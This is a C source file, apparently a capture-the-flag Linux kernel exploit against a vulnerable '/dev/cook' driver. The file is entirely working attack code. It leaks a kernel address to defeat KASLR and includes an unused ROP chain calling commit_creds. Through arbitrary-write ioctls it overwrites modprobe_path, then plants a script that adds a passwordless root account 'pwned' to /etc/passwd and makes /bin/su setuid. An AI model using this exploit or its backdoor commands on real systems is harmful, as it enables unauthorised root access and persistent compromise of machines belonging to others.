#include <fcntl.h>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <sys/stat.h>
#include <unistd.h>

#define DEVICE_NAME "/dev/cook"
#define RAW_IMAGE_BASE 0xffffffff81000000

#define prepare_kernel_cred (image_base + 0x0881c0)
#define commit_creds (image_base + 0x087e80)
#define kpti_trampoline (image_base + 0xc00a2f)
#define pop_rdi (0xffffffff81001518 + offset)

int global_fd;

size_t user_cs, user_rflags, user_sp, user_ss;
size_t cookie, image_base, offset;
size_t tmp_buf, cred_struct;

enum current_state {
    create_cred_struct_state,
    spawn_shell_state,
} global_cstate;

void _swrite(void *buf, size_t sz) {
    ssize_t nb = write(global_fd, buf, sz);
    if (nb < 0) {
        puts("[!] Failed to write to device");
        exit(EXIT_FAILURE);
    }
    printf("[*] Wrote 0x%zx bytes\n", nb);
}

void _sread(void *buf, size_t sz) {
    ssize_t nb = read(global_fd, buf, sz);
    if (nb < 0) {
        puts("[!] Failed to read from device");
        exit(EXIT_FAILURE);
    }
    printf("[*] Read 0x%zx bytes\n", nb);
}

void _sioctl(size_t cmd, void *arg) {
    ioctl(global_fd, cmd, arg);
}

void open_dev(void) {
    global_fd = open(DEVICE_NAME, O_RDWR);
    if (global_fd < 0) {
        puts("[!] Failed to open device");
        exit(EXIT_FAILURE);
    }
    puts("[*] Device opened");
}

void spawn_shell(void) {
    uid_t uid = geteuid();
    if (uid > 0) {
        printf("[!] Failed to get root uid (uid = %d)\n", uid);
        exit(EXIT_FAILURE);
    }
    puts("[*] Spawning shell as root uid");
    system("/bin/sh");
}

void privesc(void);

void safe_exit(void) {
    __asm__(".intel_syntax noprefix;"
            "mov tmp_buf, rax;"
            ".att_syntax noprefix;");
    if (global_cstate == create_cred_struct_state) {
        cred_struct = tmp_buf;
        printf("[*] cred_struct @ 0x%zx\n", cred_struct);
        global_cstate = spawn_shell_state;
        privesc();
        return;
    }
    spawn_shell();
}

void privesc(void) {
    size_t payload[0x200 / 8];
    size_t cookie_idx = 0x80 / 8;

    payload[cookie_idx++] = cookie;
    payload[cookie_idx++] = 0; // rbx

    if (global_cstate == create_cred_struct_state) {
        payload[cookie_idx++] = pop_rdi; // saved rip
        payload[cookie_idx++] = 0;
        payload[cookie_idx++] = prepare_kernel_cred;
    } else if (global_cstate == spawn_shell_state) {
        payload[cookie_idx++] = pop_rdi; // saved_rip
        payload[cookie_idx++] = cred_struct;
        payload[cookie_idx++] = commit_creds;
    }
    payload[cookie_idx++] = kpti_trampoline + 22;
    payload[cookie_idx++] = 0;
    payload[cookie_idx++] = 0;
    payload[cookie_idx++] = (size_t)safe_exit;
    payload[cookie_idx++] = user_cs;
    payload[cookie_idx++] = user_rflags;
    payload[cookie_idx++] = user_sp;
    payload[cookie_idx++] = user_ss;

    puts("[*] Sending payload");
    _swrite(payload, sizeof(payload));
}

void save_user_state(void) {
    __asm__(".intel_syntax noprefix;"
            "mov user_cs, cs;"
            "mov user_sp, rsp;"
            "mov user_ss, ss;"
            "pushf;"
            "pop user_rflags;"
            ".att_syntax;");
}

void aaw(uint64_t addr, uint64_t data) {
    uint64_t buf[] = {addr, data};
    _sioctl(0xfade, buf);
}

uint64_t aar(uint64_t addr) {
    uint64_t buf[] = {0xcafebabedeadbeef, addr};
    _sioctl(0x6969, buf);
    return buf[0];
}

#define MODPROBE_TRIGGER_PATH "/home/blud/x"
#define PWN_PATH "/home/blud/p"

void modprobe_init() {
    int fd = open(MODPROBE_TRIGGER_PATH, O_RDWR | O_CREAT);
    if (fd < 0) {
        puts("[!] Trigger creation failed");
        exit(EXIT_FAILURE);
    }
    char magic[] = "\xff\xff\xff\xff";
    write(fd, magic, sizeof(magic));
    close(fd);
    if (chmod(MODPROBE_TRIGGER_PATH, 0777)) {
        puts("[!] Error chmod trigger");
        exit(EXIT_FAILURE);
    }
}

void pwn_init() {
    int pwn_fd = open(PWN_PATH, O_CREAT | O_RDWR);
    if (pwn_fd < 0) {
        printf("[!] Unable to create %s\n", PWN_PATH);
        exit(EXIT_FAILURE);
    }
    dprintf(pwn_fd, "#!/bin/sh\n"
                    "echo 'pwned::0:0:root:/:/bin/sh' >> /etc/passwd\n"
                    "/bin/chown root:root /bin/su\n"
                    "/bin/chmod +s /bin/su");
    close(pwn_fd);
    if (chmod(PWN_PATH, 0777)) {
        puts("[!] Error chmod pwn");
        exit(EXIT_FAILURE);
    }
}

int main(void) {
    save_user_state();
    puts("[*] User state saved");

    open_dev();
    // static memory address <https://ret2school.github.io/post/iwindow/>
    uint64_t leak = aar(0xfffffe0000002f50);
    printf("[*] leak: 0x%lx\n", leak);

    /* image_base = leak - 0xe00d3b; */
    image_base = ((leak >> 20) - 0xe) << 20;
    printf("[*] image base @ 0x%lx\n", image_base);

    if ((image_base & 0xfffff) != 0) {
        puts("[!] Incorrect image base");
        exit(EXIT_FAILURE);
        close(global_fd);
    }

    uint64_t modprobe_path = image_base + 0x1852420;

    char mppath1[] = "/home/bl";
    aaw(modprobe_path, (uint64_t)mppath1);

    char mppath2[] = "ud/p";
    aaw(modprobe_path + 0x8, (uint64_t)mppath2);
    puts("[*] overwritten modprobe_path");

    modprobe_init();
    pwn_init();
    system("/home/blud/x 2>/dev/null");
    system("cat /etc/passwd");
    system("su pwned");

    close(global_fd);

    return 0;
}
